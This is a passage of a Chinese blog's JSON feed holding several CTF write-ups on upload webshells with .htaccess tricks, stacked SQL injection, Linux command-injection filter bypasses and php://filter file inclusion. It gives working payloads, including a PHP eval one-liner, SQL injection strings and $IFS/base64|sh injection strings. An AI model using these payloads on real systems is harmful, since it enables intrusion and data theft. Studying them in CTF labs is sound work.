wooyun.jpg/.php, 在这个目录下就会生成一句话木马 shell.php</p>\n<hr>\n<p>继续本题 &gt;&gt;</p>\n<p>思路：先假装传图片，然后改格式为 php 或者其他的几个</p>\n<p>在本地写一个 txt，用 php 的一句话，后缀改为 jpg 传入，同时用 burp 抓包：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvZlpUOHAzeW5YSXhyUGprLnBuZw==\">https://i.loli.net/2021/08/02/fZT8p3ynXIxrPjk.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>然后改后缀，文件格式保持不变，经过尝试，php 会报错，用 phtml 可以成功上传：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvdGZJVjZUTlh6RHdFQWRQLnBuZw==\">https://i.loli.net/2021/08/02/tfIV6TNXzDwEAdP.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>根据 unload 的位置，链接蚁剑，登录，在根目录获取 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvaHhmVzQ5dXplMTdBbEt3LnBuZw==\">https://i.loli.net/2021/08/02/hxfW49uze17AlKw.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<h1 id=\"3极客大挑战-2019upload\"><a class=\"anchor\" href=\"#3极客大挑战-2019upload\">#</a> 3.[极客大挑战 2019] Upload</h1>\n<p>本题也是，只能上传图片格式，思路同上题一样，传一个 一句话木马 。</p>\n<p>本地写好后，抓包，改后缀 phtml（php 被 ban 了），发现 &lt;? 也被 ban 了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvRWVBZ25TSmNSbWR6SXRGLnBuZw==\">https://i.loli.net/2021/08/02/EeAgnSJcRmdzItF.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>试一下上面的第一个代码：</p>\n<pre><code class=\"language-php+HTML\">&lt;script language=&quot;php&quot;&gt;eval($_POST['flag']);&lt;/script&gt;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvY2I3cnVHZXFvNFVwMVRCLnBuZw==\">https://i.loli.net/2021/08/02/cb7ruGeqo4Up1TB.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>发现还是能检测不是图片，在语句前加一个  <code>GIF86a</code>  伪装一下：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvNHlJdVFQWmhZSDFWS3p3LnBuZw==\">https://i.loli.net/2021/08/02/4yIuQPZhYH1VKzw.png</span>&quot; alt=&quot;9.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>可以发现成功上传，因为没有具体回显地址，又根据网址后面的后缀，可以猜测应该是上传到 upload 中：</p>\n<p><img data-src=\"https://i.loli.net/2021/08/02/jeQoCLwqA3vm5sn.png\" alt=\"10.png\">&lt;!--p10--&gt;</p>\n<p>果然，直接打开蚁剑：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvWkNWa3ppdzFwbVdkU0h2LnBuZw==\">https://i.loli.net/2021/08/02/ZCVkziw1pmWdSHv.png</span>&quot; alt=&quot;11.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p11--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvWWpmVWlKdkk2Q2xtRmVuLnBuZw==\">https://i.loli.net/2021/08/02/YjfUiJvI6ClmFen.png</span>&quot; alt=&quot;12.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p12--&gt;</p>\n<hr>\n<h1 id=\"4mrctf2020你传你呢\"><a class=\"anchor\" href=\"#4mrctf2020你传你呢\">#</a> 4.[MRCTF2020] 你传你🐎呢</h1>\n<p>这题前面的流程，思路和 2 一样，先伪造上传，然后改后缀</p>\n<p>但是再多次尝试后发现改后缀依旧被 ban，采用 3 的方法还是被 ban, 只能上传图片：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvSjQ2SUNrSHRVeUJYcVB3LnBuZw==\">https://i.loli.net/2021/08/02/J46ICkHtUyBXqPw.png</span>&quot; alt=&quot;13.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p13--&gt;</p>\n<p>再查阅资料后，发现是需要更改 htaccess 配置，将其他类型文件转为 php 文件</p>\n<h2 id=\"htaccess\"><a class=\"anchor\" href=\"#htaccess\">#</a> <strong>htaccess</strong></h2>\n<pre><code class=\"language-txt\">.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能\n</code></pre>\n<p>将下面的内容写入 .htaccess（注意没有名字，直接.htaccess!!!）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"flag.jpg\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><p>第一行要保证与需修改的文件同名</p>\n<p>（这个也行，这个意思是将 jpg 全当成 php）（注意没有名字，直接.htaccess!!!）</p>\n<pre><code>AddType application/x-httpd-php .jpg\n</code></pre>\n<p>随便选一个上传</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIveVUzY2diNnpTbmRIVEJSLnBuZw==\">https://i.loli.net/2021/08/02/yU3cgb6zSndHTBR.png</span>&quot; alt=&quot;14.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p14--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDIvZnpUOUFsVk1STFp0UGp2LnBuZw==\">https://i.loli.net/2021/08/02/fzT9AlVMRLZtPjv.png</span>&quot; alt=&quot;15.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p15--&gt;</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "upload"
            ]
        },
        {
            "id": "http://example.com/2021/08/01/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "url": "http://example.com/2021/08/01/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "title": "(ctfwp)sql堆叠注入及预编译的学习",
            "date_published": "2021-08-01T07:01:31.153Z",
            "content_html": "<p>很久没有碰 sql 注入了，最近几天复习了一下，顺便掌握了点新的知识。</p>\n<p>好多题的 wp 我都懒得写了，挑一两道写吧</p>\n<p><span id=\"more\"></span></p>\n<p>先推一下两篇很有帮助的文章，以后自己复习用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDMyMzkxNDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMiU3RWRlZmF1bHQtMS5jb250cm9sJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTIlN0VkZWZhdWx0LTEuY29udHJvbA==\">[强网杯 2019] 随便注 的三种解法</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgyL2FydGljbGUvZGV0YWlscy8xMDk4OTg5MzQ=\">MySQL 之 handler 的详细使用及说明</span></p>\n<h2 id=\"1强网杯-2019随便注\"><a class=\"anchor\" href=\"#1强网杯-2019随便注\">#</a> 1.[强网杯 2019] 随便注</h2>\n<p>1. 先试试万能密码  <code>1‘ or 1=1 #</code></p>\n<p>有回显，这说明可以注入：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvbU85NExhNkJjWHlRQWplLnBuZw==\">https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>做个 FUZZ 测试，不放图了，发现 select 等关键词都被 ban 了，无法联合，只能少量报错注入。</p>\n<p>因此考虑堆叠注入。</p>\n<p>查库名：</p>\n<pre><code class=\"language-mysql\">1'; show databases;#  \n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvTUZJNGJxUXV3SkxTR1hOLnBuZw==\">https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>查表名:</p>\n<pre><code class=\"language-mysql\">1'; show tables;#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdTVlelgxR0Nadk1ZeG9RLnBuZw==\">https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>显然 flag 应该在长的那串数字里，查列名:</p>\n<pre><code class=\"language-mysql\"> 1'; show columns from `1919810931114514`;#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvUVhod1BsQTRCazFheUdWLnBuZw==\">https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>flag 在这里，但是显示不出来 flag，很尴尬，于是学会了两个方法，</p>\n<p>第一种比较常规，第二种比较万能。</p>\n<p><strong>第一种：预编译</strong></p>\n<p>因为 select 被 ban 了，可以考虑 <strong>16 进制编码</strong>绕过，也可以考虑<strong>拼接语句</strong>绕过，我用了拼接语句。</p>\n<p>先构造语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">`</span><span class=\"token number\">1919810931114514</span><span class=\"token punctuation\">`</span></pre></td></tr></table></figure><p>进行预编译：</p>\n<pre><code class=\"language-mysql\">1'; SET @a= concat('sel','ect','* from `1919810931114514`'); prepare flag from @a; execute flag;#\n</code></pre>\n<p>注释一下：</p>\n<ol>\n<li>定义：    SET @变量 = 语句（命令）</li>\n<li>预编译：   prepare name from 语句</li>\n<li>执行：   excute name</li>\n</ol>\n<hr>\n<p><strong>第二种：handler 方法</strong></p>\n<p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到 SQL 标准中。</p>\n<p><strong>此处需要用到的语法：</strong></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdkxGaDllTXFhNkRDOE9XLnBuZw==\">https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>构造 payload：</p>\n<pre><code class=\"language-mysql\">1'; handler `1919810931114514` open as a; handler a read first;#\n</code></pre>\n<p>随便哪个 payload 都可得到 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdUxleHI1cDYzQ1VzUW13LnBuZw==\">https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>另外本题还能通过改名和 mysql 约束去做，感觉太麻烦了，没学。。</p>\n<hr>\n<p>后面遇到堆叠注入和预编译的题再补上，就这样</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/07/27/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://example.com/2021/07/27/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "(ctfwp)网站中linux命令执行",
            "date_published": "2021-07-27T13:45:24.931Z",
            "content_html": "<p>这类的题不算多，在这里稍微总结一下</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"gxyctf2019ping-ping-ping\"><a class=\"anchor\" href=\"#gxyctf2019ping-ping-ping\">#</a> [GXYCTF2019]Ping Ping Ping</h1>\n<p>第一次做这种题，有思路但缺少经验，所以没做出来，下面是 wp。</p>\n<p>进去界面什么都没有，只有  /?ip=</p>\n<p>查看源码无果，抓包无果，尝试输入 /?ip=1</p>\n<p>有结果 根据提示：ping</p>\n<p>考虑是 linux 命令，尝试查看目录  /?ip=1;ls</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/wk9qAWMTK8dtsyU.png\" alt=\"1.1.png\">&lt;!--p1--&gt;</p>\n<p>根据结果 cat flag.php，结果不让看，提示猜测应该是过滤了空格</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/bm2O53pIYcLjNzw.png\" alt=\"1.2.png\">&lt;!--p2--&gt;</p>\n<p>经过百度后，发现有以下几种绕过过滤空格的方式：</p>\n<blockquote>\n<ol>\n<li>${IFS} 替换</li>\n<li>$IFS$1 替换</li>\n<li>${IFS 替换</li>\n<li>%20 替换</li>\n<li>&lt;和 &lt;&gt; 重定向符替换</li>\n<li>%09 替换</li>\n</ol>\n</blockquote>\n<p>尝试第一种不行，<strong>(这里我提前做了下 FUZZ 测试，就不放图了，因为我看大佬都没用)</strong> 发现 {} 等等都被过滤了</p>\n<p>于是用第二种</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/gxF3pWdyJhYZwlc.png\" alt=\"1.3.png\">&lt;!--p3--&gt;</p>\n<p>发现 flag 被过滤了，查阅资料后，发现两张方式最合适。</p>\n<p><strong>第一种最常规：</strong>  命令执行拼接</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>a<span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1fla</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span>php</pre></td></tr></table></figure><p>原理就是 linux 命令的拼接，让 a=g，然后将 flag 换为 fla$a</p>\n<p><strong>第二种最牛逼：</strong>  内联绕过</p>\n<p>内联，就是将反引号内命令的输出作为输入执行。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1</span><span class=\"token string backtick-quoted-string\">`ls`</span></pre></td></tr></table></figure><p>ls 输出的内容直接被执行了</p>\n<p>flag 如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/OYtxEreBvki36Vm.png\" alt=\"1.4.png\">&lt;!--p4--&gt;</p>\n<hr>\n<p>另外我还学到了一些其他的方法，可能本题不适用，但也很常见。</p>\n<p><strong>单引号、双引号绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca\"t fl<span class=\"token string\">''</span>ag</pre></td></tr></table></figure><p><strong>反斜线绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca<span class=\"token punctuation\">\\</span>t fl<span class=\"token punctuation\">\\</span>ag</pre></td></tr></table></figure><p><strong>$1、$2 等和 $@绕过</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token variable\">$1at</span> gh<span class=\"token variable\">$@</span>twf01.txt</pre></td></tr></table></figure><p>如果<strong> cat 被过滤</strong>，可以用下边的方法进行绕过～～</p>\n<pre><code>(1)more:一页一页的显示档案内容\n\n(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页\n\n(3)head:查看头几行\n\n(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\n\n(5)tail:查看尾几行\n\n(6)nl：显示的时候，顺便输出行号\n\n(7)od:以二进制的方式读取档案内容\n\n(8)vi:一种编辑器，这个也可以查看\n\n(9)vim:一种编辑器，这个也可以查看\n\n(10)sort:可以查看\n\n(11)uniq:可以查看\n\n(12)file -f:报错出具体内容\n</code></pre>\n<hr>\n<p>本题还可以用</p>\n<p><strong>sh，bash 下编码</strong></p>\n<p>payload：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo$IFS$1Y2F0IGZsYWcucGhw<span class=\"token operator\">|</span>base64$IFS$<span class=\"token number\">1</span><span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>sh</pre></td></tr></table></figure><p>Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码</p>\n<pre><code class=\"language-sh\">echo&quot;str&quot; | base64 -d\n将base64编码的字符串str+换行 解码输出\n</code></pre>\n<p>|sh 是以 sh 运行，不是 bash。</p>\n<p>具体参考下面这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2VzbW8xOTg5L2FydGljbGUvZGV0YWlscy81MTA5MzQ4OQ==\">Linux base64 -- 用 base64 编解码</span></p>\n<hr>\n<p>另外，常见的管道符还有 <code>||</code>    <code> ;</code>   如果做不出来可以尝试下其他的。</p>\n<hr>\n<p>有新题我会补两道</p>\n<p>END</p>\n",
            "tags": [
                "命令执行"
            ]
        },
        {
            "id": "http://example.com/2021/07/27/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/",
            "url": "http://example.com/2021/07/27/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/",
            "title": "(ctfwp)伪协议文件包含漏洞",
            "date_published": "2021-07-27T09:46:52.065Z",
            "content_html": "<p>很久没写了，随便写写，一切从简吧，最近搞 python 比较多。</p>\n<p>主要是记录一下新知识。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019secret-file\"><a class=\"anchor\" href=\"#1极客大挑战-2019secret-file\">#</a> 1.[极客大挑战 2019] Secret File</h1>\n<p>进去先探索一下，没啥有用的，看源码，根据提示走。</p>\n<p>发现第三步直接被跳过了，直接 end 了：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvcEJJbzN3bkRaOWE3YktWLnBuZw==\">https://i.loli.net/2021/07/27/pBIo3wnDZ9a7bKV.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>用 F12 看了半天没啥名堂，只能抓包确实能抓到东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvdzhJMldudUtEYlV6UkNhLnBuZw==\">https://i.loli.net/2021/07/27/w8I2WnuKDbUzRCa.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>于是顺藤摸瓜打开网页，提示 flag 在 flag.php 里，但是打开后显示不出来：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvZHQzVnJIbkFqSzd5dXB6LnBuZw==\">https://i.loli.net/2021/07/27/dt3VrHnAjK7yupz.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>前面还有个过滤，但是没有过滤 filter，考虑伪协议：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token argument-name\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><p>得到 base64，解密得到 flag。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvNjFwTjlmenFkcmlnSjJ0LnBuZw==\">https://i.loli.net/2021/07/27/61pN9fzqdrigJ2t.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<hr>\n<h1 id=\"2actf2020-新生赛include\"><a class=\"anchor\" href=\"#2actf2020-新生赛include\">#</a> 2.[ACTF2020 新生赛] Include</h1>\n<p>进去只有一个 tip，点开不难发现，是一个文件读取的方式读处的数据：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvV1FoN2piZDY4bHEyeHRvLnBuZw==\">https://i.loli.net/2021/07/27/WQh7jbd68lq2xto.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>结合本题题目，考虑伪协议，文件包含。</p>\n<p>我自己做的时候还抓了一下包，确实没有什么其他方法。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token argument-name\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><p>得到 base64，解密得到 flag。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMjcvVFNkekk2Q0QxWXJHSlVtLnBuZw==\">https://i.loli.net/2021/07/27/TSdzI6CD1YrGJUm.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<hr>\n<p>有新题我会继续补两道</p>\n<p>END</p>\n",
            "tags": [
                "文件包含"
            ]
        },
        {
            "id": "http://example.com/2021/07/08/(ctfwp)http&java/",
            "url": "http://example.com/2021/07/08/(ctfwp)http&java/",
            "title": "(ctfwp)http&java",
            "date_published": "2021-07-08T14:30:37.254Z",
            "content_html": "<p>最近遇到不少奇奇怪怪的题，方法很少见且唯一，直接总结一下。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019http\"><a class=\"anchor\" href=\"#1极客大挑战-2019http\">#</a> 1.[极客大挑战 2019] Http</h1>\n<p>进去后是个介绍页面，由于没有信息，先查看源码</p>\n<p>发现相关信息，看名字可能与答案有关：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvNzVpU09GS2h1THZFcXp4LnBuZw==\">https://i.loli.net/2021/07/09/75iSOFKhuLvEqzx.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>点进去后界面如下：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvUWF5dVdyRDVQWHZaMjhvLnBuZw==\">https://i.loli.net/2021/07/09/QayuWrD5PXvZ28o.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>根据网页提示，应该在头请求里修改 referer，这里有很多方法（burp 抓包添加，火狐 F12 网络里拦截修改，hackbar 修改）</p>\n<p>我都已尝试过了，所以这里用最简单的 hackbar：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvSjcyeFZPOUkzcmh3UzVGLnBuZw==\">https://i.loli.net/2021/07/09/J72xVO9I3rhwS5F.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>界面如下，根据提示，要通过 Syclover 浏览，所以修改 user-agent：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvYmVOUTdwOEpMd21PQjJ6LnBuZw==\">https://i.loli.net/2021/07/09/beNQ7p8JLwmOB2z.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>界面如下，再根据提示，需要本地查看</p>\n<p>在简单的学习后，发现通过 X-Forwarded-For:127.0.0.1 可以伪造 ip 地址到本地</p>\n<p>（顺便学习了一下 html 请求头和响应头，相关文章附到后文）</p>\n<p>此时不能用 hackbar 添加，所以我选择用火狐工具直接修改：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvYUR0UGJ5V3M3RjFyWWpRLnBuZw==\">https://i.loli.net/2021/07/09/aDtPbyWs7F1rYjQ.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDkvQWJIMmtKcUVLMWVDeDRTLnBuZw==\">https://i.loli.net/2021/07/09/AbH2kJqEK1eCx4S.png</span>&quot; alt=&quot;1.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<h1 id=\"2roarctf-2019easy-java\"><a class=\"anchor\" href=\"#2roarctf-2019easy-java\">#</a> 2.[RoarCTF 2019]Easy Java</h1>\n<p>这题真是没见过就不会做，进去先注入了几下，没有；扫目录，没有，点开 help，考虑是利用了 download 下载了啥东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvVEdLSVlPOVhSM1daRmkyLnBuZw==\">https://i.loli.net/2021/08/09/TGKIYO9XR3WZFi2.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>然后就没思路了，被迫看了眼 wp：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDkvNHdTbDJ2MzFaa1lUV2RuLnBuZw==\">https://i.loli.net/2021/08/09/4wSl2v31ZkYTWdn.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom:50%;&quot; 